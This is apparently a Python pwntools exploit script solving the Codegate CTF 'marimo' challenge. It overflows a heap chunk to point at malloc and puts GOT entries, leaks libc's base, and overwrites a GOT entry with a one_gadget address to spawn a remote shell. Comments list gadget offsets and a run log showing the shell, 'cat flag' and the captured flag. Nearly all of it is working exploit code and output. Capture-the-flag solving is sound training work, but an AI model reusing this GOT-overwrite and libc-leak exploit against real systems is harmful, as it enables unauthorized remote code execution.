from pwn import *

#r=process("./marimo")
host="ch41l3ng3s.codegate.kr"

port=3333
r = remote(host,port)
libc=ELF("./libc.so.6")


#gdb.attach(r)
def add(name,content):
	r.sendline("show me the marimo")
	r.recvuntil(">> ")
	r.sendline(name)
	r.recvuntil(">> ")
	r.sendline(content)
	r.recvuntil(">> ")
	sleep(1)

def edit(number,content):
	r.sendline("V")
	r.sendline(str(number))
	r.sendline("M")
	r.recvuntil(">> ")
	r.sendline(content)
	r.recvuntil(">> ")
	r.sendline("B")
	r.recvuntil(">> ")
	sleep(2)

def leak(number):
	r.sendline("V")
	r.sendline(str(number))
	r.recvuntil("name : ")
	leak=r.recvuntil("\n")
	#print leak
	#print len(leak)
	#print hex(u64(leak[:-1].ljust(8,"\x00")))
	leak=hex(u64(leak[:-1].ljust(8,"\x00")))
	r.recvuntil(">> ")
	r.sendline("B")
	r.recvuntil(">> ")
	sleep(2)
	return leak



malloc_got=0x0000000000603050
put_got=0x0000000000603018

pause()
r.recvuntil(">> ")
add("PPPP","QQQQ")
add("RRRR","SSSS")
add("TTTT","UUUU")
add("VVVV","WWWW")
edit(0,"Q"*8+p64(0)*4+p64(0x21)+p64(0x000000015a75b885)+p64(malloc_got)+p64(put_got))
#sleep(10)
r.recvuntil(">> ")

malloc=leak(1)
malloc=int(malloc,16)

lib_base=malloc-libc.symbols['malloc']
one=lib_base+0x45216
print "leaked libcbase ="+hex(lib_base)
print "leaked malloc ="+hex(malloc)
print "leaked one ="+hex(one)

sleep(20)
edit(1,p64(one))



r.interactive()


# 0x45216	execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a	execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4	execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147	execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL


# [*] Paused (press any to continue)
# leaked libcbase =0x7f1cf459c000
# leaked malloc =0x7f1cf4620130
# leaked one =0x7f1cf45e1216
# [*] Switching to interactive mode
# $ ls
# flag
# marimo
# $ cat flag
# But_every_cat_is_more_cute_than_Marimo
# $  
